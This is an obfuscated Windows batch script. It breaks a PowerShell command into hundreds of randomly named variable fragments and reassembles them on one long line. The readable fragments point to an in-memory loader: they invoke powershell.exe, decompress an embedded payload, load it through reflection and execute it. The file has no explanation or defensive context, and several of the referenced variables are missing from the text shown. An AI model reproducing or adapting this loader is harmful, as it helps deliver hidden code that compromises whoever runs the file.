@echo off
!kVawqRDhXyNhCmSBuQkj! "tXmsDuGtjW=flec"
!kVawqRDhXyNhCmSBuQkj! "IlkwVUeMNs=m.Co"
!kVawqRDhXyNhCmSBuQkj! "tmKScNaFTw=s_va"
!kVawqRDhXyNhCmSBuQkj! "WwXhyjVDJy=tion"
!kVawqRDhXyNhCmSBuQkj! "dIGqmGnxEp=6] -"
!kVawqRDhXyNhCmSBuQkj! "LSMJWktGSP=g(3)"
!kVawqRDhXyNhCmSBuQkj! "BAOZGHOtQn=mory"
!kVawqRDhXyNhCmSBuQkj! "ETMDJNwKzX=ctio"
!kVawqRDhXyNhCmSBuQkj! "FbGXcUFfNq=Syst"
!kVawqRDhXyNhCmSBuQkj! "yQJOfkzCzr=)));"
!kVawqRDhXyNhCmSBuQkj! "mwDaIzgZBD= ('%*'"
!kVawqRDhXyNhCmSBuQkj! "cyzbEiBKFa=ss);"
!kVawqRDhXyNhCmSBuQkj! "xNTjPEKGaP=aram"
!kVawqRDhXyNhCmSBuQkj! "KuENTMMIbo=Crea"
!kVawqRDhXyNhCmSBuQkj! "ZAefMnTVAx=yloa"
!kVawqRDhXyNhCmSBuQkj! "CYoBMNCvTy=orF'"
!kVawqRDhXyNhCmSBuQkj! "KAHbatXOEX=r.Mo"
!kVawqRDhXyNhCmSBuQkj! "uKClbkuNVa=retu"
!kVawqRDhXyNhCmSBuQkj! "cziMLLRxWp=indo"
!kVawqRDhXyNhCmSBuQkj! "vqdMcNMNRZ=oL'["
!kVawqRDhXyNhCmSBuQkj! "IWpLwzAvVW=VTKh"
!kVawqRDhXyNhCmSBuQkj! "oBVjjKaFxn=cute"
!kVawqRDhXyNhCmSBuQkj! "WRNObSRXzc=n);	"
!kVawqRDhXyNhCmSBuQkj! "KYfyjxjUaL='[-1"
!kVawqRDhXyNhCmSBuQkj! "lhPfdtGwcQ=Bloc"
!kVawqRDhXyNhCmSBuQkj! "rFqcDHvPfM=mpre"
!kVawqRDhXyNhCmSBuQkj! "dRPXrzpbvR=[Sys"
!kVawqRDhXyNhCmSBuQkj! "QdIIXIqrdF=ose("
!kVawqRDhXyNhCmSBuQkj! "YjfrnaHdFU=$dec"
!kVawqRDhXyNhCmSBuQkj! "QghtQZWVvU=));"
!kVawqRDhXyNhCmSBuQkj! "UyWRKicbbc=:('g"
!kVawqRDhXyNhCmSBuQkj! "SeflyngPEF=v1.0"
!kVawqRDhXyNhCmSBuQkj! "zFtCTYxcDL=ndow"
!kVawqRDhXyNhCmSBuQkj! "HjLxEEIHBF=ell."
!kVawqRDhXyNhCmSBuQkj! "zPPyLLMsJZ=\pow"
!kVawqRDhXyNhCmSBuQkj! "IHOqdzInOj=ell\"
!kVawqRDhXyNhCmSBuQkj! "gYZuZYeLKC=\Sys"
!kVawqRDhXyNhCmSBuQkj! "NmTTDTRqFr=exe""
!kVawqRDhXyNhCmSBuQkj! "xmWBVVpxWu=2\Wi"
!kVawqRDhXyNhCmSBuQkj! "XxwDJLVQJc=\Win"
!kVawqRDhXyNhCmSBuQkj! "GkggXqwAHx=sPow"
!kVawqRDhXyNhCmSBuQkj! "NqDOmTBEiz= "
!kVawqRDhXyNhCmSBuQkj! "rmhPNQxPgq=dows"
!kVawqRDhXyNhCmSBuQkj! "WZDAcZvPdx=ersh"
!kVawqRDhXyNhCmSBuQkj! "ixmJlWvATZ="%systemdrive%"
!kVawqRDhXyNhCmSBuQkj! "JOSaSTcyyd=erSh"
!kVawqRDhXyNhCmSBuQkj! "fbQHiqhJWf=tem3"
%ixmJlWvATZ%%XxwDJLVQJc%%rmhPNQxPgq%%gYZuZYeLKC%%fbQHiqhJWf%%xmWBVVpxWu%%zFtCTYxcDL%%GkggXqwAHx%%JOSaSTcyyd%%IHOqdzInOj%%SeflyngPEF%%zPPyLLMsJZ%%WZDAcZvPdx%%HjLxEEIHBF%%NmTTDTRqFr%%NqDOmTBEiz%%YMIHEgilyG%%WpGEnhDADI%%RQnqnfqEmr%%ozqHUQhVai%%ijhwLsXtzX%%OBCLCiyrty%%PEYgrxYYJx%%aHAuzIJQFV%%iXepCNWFfM%%sPBBsEkafn%%tYJcWhailT%%yHMypSzJEE%%BtTWflfYcV%%xILrBkncsu%%MOtlnKcdlA%%eAwAMZeMXL%%cbfpwPVuWf%%EwrjRMaIIu%%ibNCRXmlEC%%gBfGsKIdPy%%PIggVHjmIa%%ZvdCDaoDyy%%DKPuZdrKQh%%eWTkFzUGGk%%NZCECKxDdr%%veFqVeSMhS%%qzwBVcCSXd%%gHXnLDikRo%%FOGyLaqDpA%%HizOUoDaJz%%hFFalNhrEr%%WHUSmCSXQV%%MYCxvXiitw%%ZhBshZiGnX%%SZYXDZnHBr%%wFkNNjciEn%%FYYisOfCLn%%tmKScNaFTw%%KAHbatXOEX%%XabZsUaQFO%%TKWoYkVrKa%%jxoiDeqWhY%%RrXNptkLAi%%MjZeCaEtdQ%%yGdEOALTwn%%DeIHXBMjYF%%ZjQCoZykFC%%AXSrzkotYP%%HrpnEHArha%%nvuyQoPAqP%%cBnTMGlriM%%nskjXIUCYG%%ygcEpfDuBk%%uNdjNgdvAX%%vjjuNUklAh%%unCJqVyJEH%%dRPXrzpbvR%%FycakoXIRu%%UrTtQhluSR%%HtRSUEtldn%%FjPJBVkByb%%YQRjNLXwhj%%nUiEjlHjgG%%VMFDPLCkRU%%XKVQTRCIfj%%HXdTaKalzq%%obvSgmlotb%%iMEmmDZsKs%%JYdXZXILDf%%KrLBGWpdKH%%GnodaUtQHw%%LIAhGpXyTj%%DzKoqQacGq%%oVHcLvJaWe%%DSegtcREVq%%YQkBegDaMj%%TrkriPaxvk%%FXBPFLvEUo%%ZwhprxLgYF%%SJnNkmHMXE%%btjKKbpvVs%%KYfyjxjUaL%%eTyPsWKOEs%%dIGqmGnxEp%%hqlGUTEODN%%cNMmziUtrO%%rAQCpcsOmC%%jMqKDOISVy%%rVlRqqVuQe%%MTfPXHzIqS%%BPCaDpxcIL%%zbyTxwpYmZ%%gYXhQpHANW%%oZBcXBtkoa%%STMfFKvmsB%%rAwrLCRukn%%IWpLwzAvVW%%dfKlgmlSCg%%UvilFODjru%%JYabsVEaIf%%kZqvymQkly%%qZSdsmOdgI%%VqeAmefITk%%IlkwVUeMNs%%XtYSeKfWIg%%gBUajUVQjt%%hhqaQfOvix%%hcqNKCrmwC%%YiaNdhqkmb%%ZoCtlQcYbY%%VKOkYekgpH%%CIuGuYhDWI%%OEigxSzWCU%%ztkxHouPOZ%%WkUFzrUVZn%%IybsjqCHNf%%EoEuhixWZg%%DrOXMEKDHg%%YDXplbsRnq%%MNcIuIFAxq%%TYWTJrKeGF%%GZZGhbrpig%%QGIJuQpfCd%%YjfrnaHdFU%%qolIKMNvBt%%qqrqzmpnzS%%bEBCGwTIth%%tnJoPCvZYH%%dTEjNISORa%%KuENTMMIbo%%TectZdHdBW%%RpoRPhZsPY%%EfQsxZIWud%%QMYKOYQljJ%%aOnUiufNYL%%MtSdJOnKWa%%uLIxgerEdQ%%rOjfXPRWkd%%TVXJqwUUaa%%LgpjppfPOd%%cBJitYkMfU%%WrzSgyNYhK%%kwDdfkzaQI%%JbigasmPps%%lhPfdtGwcQ%%ChIdSFXFdj%%zkWxkVjtSO%%mXIOydHxaL%%DdXZfCsenu%%uGMgTbksVi%%knDoEEyTFP%%YzFrGvnWrI%%CfgytFlCVx%%SoCRBpzJvB%%dzzywUauzx%%OoamGfhfUY%%tVXhWJWNQq%%WEAQEcFHby%%FQcyJEnqlw%%itOxiiBrCM%%YmEjAjNkHD%%zzdwtCSzyr%%vGCuhCPdIw%%BoepAsmTXz%%QdIIXIqrdF%%pbSkqrKkbY%%uKClbkuNVa%%qZBZAsYTxz%%mxZchzwUZj%%HbSZfgAwGM%%nCwcopzSJX%%tQNCMWKAdC%%OAOMtogCUu%%SBnKlJbWNR%%ZDkbQQoqmi%%vZseYMOJJa%%jWYpeRDcqc%%UNMmCkqMWC%%aQqLYSiiLy%%VsnNIcFUXY%%nlZjoIngCO%%wbMhZsGmqm%%JvqShCAZEz%%EvPYpORgxq%%FbGXcUFfNq%%wtELpSVhcL%%hnCcjamOSl%%BAOZGHOtQn%%XulndlReJw%%TJdMjrzDOb%%HQnCOVEFeH%%dCrPOMcoZX%%jifvsRwcQp%%hkFOFghJyh%%GlZbtrsoXw%%plEQSzLRjX%%yCPPATWCjI%%FsPRrXiecb%%yietZWFOVf%%vpzBIdwkBz%%uPepRXvNyU%%rGPizqyvPD%%niGempSoin%%AYDCGIeOCc%%BSqbOOArbs%%EbuXmmjZcB%%egEkutdmBQ%%mKSNbvRFqy%%OBmQIyDFqu%%zeLbYunfGu%%KnPkgUjHVR%%uDJEMDUOCV%%PyWgriYRPH%%hMYVNBLbKN%%pWJyaWuhou%%zzDLFmrITY%%WsSoKHEOQl%%RSeOFSOxgv%%NRCuhHjnpB%%jciLRXevOs%%rFqcDHvPfM%%xTCykePxgc%%yrzobOKsWI%%OtINdiAAQA%%luhDeqAJBN%%hGoMTagcaO%%WdSxYdkOuc%%EpHFQejWkL%%naQjBheWUc%%cyzbEiBKFa%%gMpziSZIVP%%QkSpAVmJWQ%%ZnUrZgPFbH%%DzrjFBLraI%%ivbemRFkAI%%WRNObSRXzc%%cuHnlrTIKZ%%kVJnIDmPfi%%AEetLMLChM%%KNRXFOONTU%%YXABxbiAgy%%FcSrCypnBz%%FqAXpxdLHT%%OyWkjCeCVK%%ElvJhHVAvh%%yAlupHwDma%%XwTmJggHiZ%%tMsRVuVQQH%%BDqzvomCVB%%gAqUNhsiaa%%BnrvOLiuyV%%MFNFytftRu%%UDMGTTwxdN%%bMQQfolVLJ%%fSdZOANLwt%%cYrFfXALCU%%pLqLTaPXzk%%hkIipcANRs%%fLaKKdukKh%%NAtQtuBrfO%%LQlllSpiqd%%xNTjPEKGaP%%FFmrwHQSPV%%AiHdHpzPyS%%NlTGKaGjbO%%JUrqifDTPE%%bxtvCogQCz%%fVhibuMGHw%%aGQalGRrVB%%LFaUQqSxdw%%TQHBJOMioO%%tXmsDuGtjW%%wPUaOzVnrL%%BoCkDkZpqx%%TJchiOtHqv%%JynhaeVHMk%%SyQCmfubPs%%vqdMcNMNRZ%%fnWWcdavky%%prCfEuSAUd%%trSYasvBen%%rhPNeFCUAj%%eZRqddOXhH%%UmTOFOvYWJ%%HzqXghBPbZ%%SXZLYuzBUW%%Eytxsfobhq%%kDYQBFJUjV%%BYWiPXmhPl%%oTdZfjfSEa%%TAHKOoZjjt%%KFrZuFBkIv%%TgmWbqAYLs%%AQpibbrltA%%XdXvAJBeFz%%HUkjhMnKJx%%OaxRTUpiXt%%oqRhxQjQwr%%PwtmKFFfbp%%NGBVLXFfCF%%usgmkqdcMr%%DxosIsGkgn%%okhIFIPVwz%%kdoQXwphct%%CDsJMqrint%%qvZorjlyGB%%BiGnhzjxvl%%cziMLLRxWp%%rGHciOeZzN%%lRAASuWfCm%%gTNbqRmmDG%%sNCrkVADes%%vkYHalZIUr%%OLUKixSGMr%%CSvSuxojqW%%TsbkQWUfbe%%SErmSHSSiN%%dURMPDOgnC%%WPsYxvJKTm%%CMFHzYAiaN%%EwaDSZBpun%%hOSyicmsPw%%XiYWkqokmR%%cGfAYzPOfx%%UupGeNUgzx%%MhtDPwydsC%%LqcDkBIsAI%%mxnsCCSsSx%%whLPfVmBKC%%bMwDMDsMvC%%eBGQkoUbbm%%DflUfDFmyp%%ohIYGAaJFZ%%kgWpsUAUEQ%%alAxYWBByj%%XfogoXTIkK%%okvbcwiVCk%%cLHIodGkZJ%%ZylwceSQbv%%aSJUBQPyuB%%NFZnglyGSl%%rIJAKPYYZX%%EsUhjkbMgy%%nhQxWtzYpQ%%GlYPesiikL%%RQzwWvLSdW%%kLztYjSlEq%%qaJjrtuedR%%bSCuHwHtAB%%IGVtFVMERU%%zWETuQhqfD%%aGPlUrieMC%%BzLdIKepDv%%GQnisfoJaQ%%ornWAcRKyo%%MHRpsalBlK%%LSMJWktGSP%%dzeWnjlOCF%%TuRoJZYXQr%%TNxpewFDaq%%IkRJlnCVbi%%PwYFRrbxaX%%mvQBVpbPRR%%EHOmXIDhdv%%xcWHCwOSyN%%uhDcemuqNV%%lNejDhIMIi%%NTuFzjziYy%%BjqewweLiK%%onuhkJYMdv%%OckqaBNYCU%%MlrpucxaMh%%dXEXTAzmuQ%%kNeCKzZZdV%%IginXdVfNi%%mYZWrRxmxA%%cBDMKZhOEU%%dxWRyXOqZQ%%EuymDlOhlT%%bMCDTgCvDY%%VgATfPcixu%%chnHVIdqjy%%kZDLSqVsYr%%usNaUxTEhO%%jFKQQUyUIk%%cmmfNWCOaO%%TKjgaJtmNx%%OzjvoEpNVY%%SaJNoigInX%%UeDtUywEPg%%AmhkwDcQQi%%HPTcWSawRS%%DLZPCJVQAQ%%iLXOxGTzrL%%fqSepflBxb%%yZMXDPmrHM%%ImpaZWReEp%%ZAefMnTVAx%%ytsyriYalI%%tCSEcSaSet%%ogWhcXVGkp%%WrRknoTQIR%%YRTWWxIzdU%%mbQgiswlwu%%nrPVLbKIrO%%YjjnvxnakF%%ovDqcVAKbV%%SIuoDHbXlU%%MaioVdRDLL%%ewaQfSNyTQ%%BZGvWqOVJO%%vqPpTompvZ%%dWZqRvHEiL%%TDdutMtNsE%%oVUXpOHLXR%%GycTMEapEA%%JkNYUSmuWg%%UyWRKicbbc%%OWHrevAkHO%%LdjSVeiVcw%%CmOQWhCljE%%CYoBMNCvTy%%scMiuQpeVF%%ZgZEzBhRuX%%ToadlNPHfi%%BMcDeAzGvg%%SxpDEwZJbl%%FLaWFdbJWH%%bHYNenevAZ%%bBvofvYxyP%%NfFUCQLgYa%%yQJOfkzCzr%%rEjckdqMQk%%fEkgTVbekn%%BYwAAkRGjU%%WwXhyjVDJy%%zZpOVUFDUj%%iurlPthJBZ%%mJDWoJGdIK%%ZyuMOCIIEG%%FnMZLBeMre%%bmcKmQwtzl%%oBVjjKaFxn%%KyeVtYWDkM%%ETMDJNwKzX%%fpitrdsCQb%%BzpdtChgqo%%TTiNHuPrAw%%oqgzhvqLDq%%FuMjleEIkg%%FptkemgvLX%%oacuMktPVY%%mwDaIzgZBD%%QghtQZWVvU%
!kVawqRDhXyNhCmSBuQkj! "ycMwAMVnPz=exit"
!kVawqRDhXyNhCmSBuQkj! "wyoHzyCCNQ= /b"
%ycMwAMVnPz%%wyoHzyCCNQ%
